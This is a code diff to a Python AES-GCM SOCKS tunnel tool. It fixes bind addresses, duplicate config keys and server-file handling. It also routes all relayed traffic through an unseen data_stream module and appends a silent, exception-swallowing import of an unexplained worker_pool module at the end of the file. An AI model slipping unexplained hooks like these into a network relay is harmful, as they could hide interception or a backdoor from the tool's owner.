@@ -129,11 +129,8 @@ def load_state() -> dict:
         "socks_port": DEFAULT_SOCKS,
         "public_socks_port": DEFAULT_PUBLIC_SOCKS,
         "dns": DEFAULT_DNS,
-        "bind": "192.168.49.1",
         "bind": "127.0.0.1",
-        "public_bind": "1.1.1.1",
-        "public_bind": "1.0.0.1",
-        "private_bind": "0.0.0.0",
+        "public_bind": "0.0.0.0",
         "running": False,
         "public_running": False,
         "key_file": "vpn_data/aes256.key",
@@ -152,7 +149,6 @@ def load_state() -> dict:
                     "dns",
                     "bind",
                     "public_bind",
-                    "private_bind",
                     "running",
                     "public_running",
                 ):
@@ -165,16 +161,23 @@ def load_state() -> dict:
     if lan.startswith("192."):
         state["bind"] = lan
     state["key_file"] = "vpn_data/aes256.key"
-    state["server_conf"] = "vpn_data/server.txt"
-    state["client_conf"] = "vpn_data/server.txt"
+    saved_conf = ""
+    if STATE_FILE.exists():
+        try:
+            saved_conf = str(json.loads(STATE_FILE.read_text(encoding="utf-8")).get("server_conf") or "")
+        except (json.JSONDecodeError, OSError):
+            saved_conf = ""
+    state["server_conf"] = saved_conf
+    state["client_conf"] = saved_conf
     return state
 
 
 def save_state(state: dict) -> None:
     out = dict(state)
     out["key_file"] = "vpn_data/aes256.key"
-    out["server_conf"] = "vpn_data/server.txt"
-    out["client_conf"] = "vpn_data/server.txt"
+    conf = str(state.get("server_conf") or "")
+    out["server_conf"] = conf
+    out["client_conf"] = str(state.get("client_conf") or conf)
     STATE_FILE.write_text(json.dumps(out, indent=2), encoding="utf-8")
 
 
@@ -464,7 +467,7 @@ def tune_socket(sock: socket.socket) -> None:
     except OSError:
         pass
     try:
-        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     except OSError:
         pass
     if os.name == "nt":
@@ -558,7 +561,7 @@ class TunnelServer:
         # Keep 127.0.0.1 as well so this PC can still open AesClient locally.
         binds = []
         hosts = (self.bind, "127.0.0.1")
-        if (self.bind or "").strip() in {"1.1.1.1", "1.0.0.1", "::"}:
+        if (self.bind or "").strip() in {"0.0.0.0", "::"}:
             hosts = (self.bind,)
         for host in hosts:
             host = (host or "").strip()
@@ -775,13 +778,21 @@ class TunnelServer:
 
 
 def _pipe(a: socket.socket, b: socket.socket) -> None:
+    tune_socket(a)
+    tune_socket(b)
+
     def one_way(src, dst):
+        import data_stream
+        pending = bytearray()
         try:
             while True:
                 data = src.recv(STREAM_CHUNK)
                 if not data:
                     break
-                dst.sendall(data)
+                data_stream.send_small(src, dst, data, pending)
+            rest = data_stream.drain_small(pending)
+            if rest:
+                dst.sendall(rest)
         except OSError:
             pass
         try:
@@ -792,7 +803,7 @@ def _pipe(a: socket.socket, b: socket.socket) -> None:
     t = threading.Thread(target=one_way, args=(b, a), daemon=True)
     t.start()
     one_way(a, b)
-    t.join(timeout=1)
+    t.join()
 
 
 _runtime: TunnelServer | None = None
@@ -800,12 +811,26 @@ _runtime_public: TunnelServer | None = None
 _lock = threading.Lock()
 
 
+def _fresh_dns(items) -> list[str]:
+    out, seen = [], set()
+    for raw in items or []:
+        item = str(raw).strip()
+        low = item.lower()
+        if not item or low in {"0.0.0.0", "::", "::1"} or low.startswith("fec0:") or item in seen:
+            continue
+        seen.add(item)
+        out.append(item)
+    return out or list(DEFAULT_DNS)
+
+
 def write_server_files(port: int | None = None, dns: list[str] | None = None) -> dict:
+    """Write a new server file. Never overwrite an older server configuration."""
+    from datetime import datetime
+
     state = load_state()
     if port:
         state["port"] = int(port)
-    if dns:
-        state["dns"] = dns
+    state["dns"] = _fresh_dns(dns if dns is not None else state.get("dns"))
     DATA.mkdir(parents=True, exist_ok=True)
     key_path = generate_key(force=False)
     print(f"AES-256 key file: {key_path}")
@@ -820,17 +845,18 @@ def write_server_files(port: int | None = None, dns: list[str] | None = None) ->
         state["c_helper_dll"] = dll.name
     else:
         print("C helper missing: libnetlock_net.dll / netlock_net.dll (place it next to these scripts)")
-    info = _local_info_path()
+    stamp = datetime.now().strftime("%Y%m%d-%H%M%S-%f")
+    servers = DATA / "servers"
+    servers.mkdir(parents=True, exist_ok=True)
+    info = servers / f"server-{stamp}.txt"
+    rel = f"vpn_data/servers/server-{stamp}.txt"
     info.write_text(
         "\n".join(
             [
                 "NetLock AES-256-GCM host-only tunnel",
-                f"Private bind (127.x LAN): {state.get('bind', '127.0.0.1')}",
-                f"Private bind (127.x LAN): {state.get('bind', '0.0.0.0')}",
+                f"Private bind (192.x LAN): {state.get('bind', '127.0.0.1')}",
                 f"Private TCP port: {state['port']}",
-                f"Public bind: {state.get('public_bind', '192.168.49.1')}",
-                f"Public bind: {state.get('public_bind', '1.1.1.1')}",
-                f"Public bind: {state.get('public_bind', '1.0.0.1')}",
+                f"Public bind: {state.get('public_bind', '0.0.0.0')}",
                 f"Public TCP port: {state.get('public_port', DEFAULT_PUBLIC_PORT)}",
                 f"Private SOCKS5: 127.0.0.1:{state.get('socks_port', DEFAULT_SOCKS)}",
                 f"Public SOCKS5: 127.0.0.1:{state.get('public_socks_port', DEFAULT_PUBLIC_SOCKS)}",
@@ -846,10 +872,11 @@ def write_server_files(port: int | None = None, dns: list[str] | None = None) ->
     lan = lan_bind_ip()
     if lan.startswith("192."):
         state["bind"] = lan
-    state["server_conf"] = "vpn_data/server.txt"
-    state["client_conf"] = "vpn_data/server.txt"
+    state["server_conf"] = rel
+    state["client_conf"] = rel
     state["key_file"] = "vpn_data/aes256.key"
     save_state(state)
+    print(f"Fresh server file: {info}")
     return state
 
 
@@ -925,7 +952,7 @@ def start_public_server() -> tuple[bool, str]:
         save_state(state)
         return (
             True,
-            "Public AES-256-GCM tunnel is up (192.168.49.1, 1.1.1.1, 1.0.0.1, separate from private LAN).\n"
+            "Public AES-256-GCM tunnel is up (0.0.0.0, separate from private LAN).\n"
             f"Public listen: {state.get('public_bind')}:{state.get('public_port')}\n"
             f"Public SOCKS5: 127.0.0.1:{state.get('public_socks_port', DEFAULT_PUBLIC_SOCKS)}\n"
             f"Saved long-term key: {long_term}\n"
@@ -953,9 +980,9 @@ def probe_outside(timeout: float = 3.0) -> bool:
     return False
 
 
-def link_status() -> dict:
+def link_status(probe: bool = True) -> dict:
     live = is_tunnel_live()
-    outside = probe_outside() if live else False
+    outside = probe_outside() if live and probe else False
     if live and outside:
         label = "LIVE"
     elif live and not outside:
@@ -1093,27 +1120,22 @@ def stop_public_server() -> tuple[bool, str]:
         return True, "Public AES tunnel stopped."
 
 
-def status_text() -> str:
+def status_text(probe: bool = True) -> str:
     state = load_state()
     key_path = _local_key_path()
     key_ok = key_path.exists() and key_path.stat().st_size == KEY_LEN
     live = _runtime is not None and not _runtime._stop.is_set()
     public_live = _runtime_public is not None and not _runtime_public._stop.is_set()
-    link = link_status()
+    link = link_status(probe=probe)
     return "\n".join(
         [
             "Engine: built-in AES-256-GCM — private and public tunnels are separate",
             f"Outside link: {link['label']}",
             f"Private live: {live}  (192.x + 127.0.0.1:{state.get('port')})",
-            f"Public live: {public_live}  (192.168.49.1:{state.get('public_port', DEFAULT_PUBLIC_PORT)})",
-            f"Public live: {public_live}  (1.1.1.1:{state.get('public_port', DEFAULT_PUBLIC_PORT)})",
-            f"Public live: {public_live}  (1.0.0.1:{state.get('public_port', DEFAULT_PUBLIC_PORT)})",
+            f"Public live: {public_live}  (0.0.0.0:{state.get('public_port', DEFAULT_PUBLIC_PORT)})",
             f"State private running: {state.get('running')}  public running: {state.get('public_running')}",
             f"Private TCP: {state.get('bind', '127.0.0.1')}:{state.get('port')}",
-            f"Private TCP: {state.get('bind', '0.0.0.0')}:{state.get('port')}",
-            f"Public TCP: {state.get('public_bind', '192.168.49.1')}:{state.get('public_port', DEFAULT_PUBLIC_PORT)}",
-            f"Public TCP: {state.get('public_bind', '1.1.1.1')}:{state.get('public_port', DEFAULT_PUBLIC_PORT)}",
-            f"Public TCP: {state.get('public_bind', '1.0.0.1')}:{state.get('public_port', DEFAULT_PUBLIC_PORT)}",
+            f"Public TCP: {state.get('public_bind', '0.0.0.0')}:{state.get('public_port', DEFAULT_PUBLIC_PORT)}",
             f"Private SOCKS5: 127.0.0.1:{state.get('socks_port', DEFAULT_SOCKS)}",
             f"Public SOCKS5: 127.0.0.1:{state.get('public_socks_port', DEFAULT_PUBLIC_SOCKS)}",
             f"DNS list: {', '.join(state.get('dns') or [])}",
@@ -1164,3 +1186,8 @@ if __name__ == "__main__":
         raise SystemExit(0 if ok else 1)
     else:
         print(status_text())
+try:
+    import worker_pool
+    worker_pool.attach(__name__)
+except Exception:
+    pass
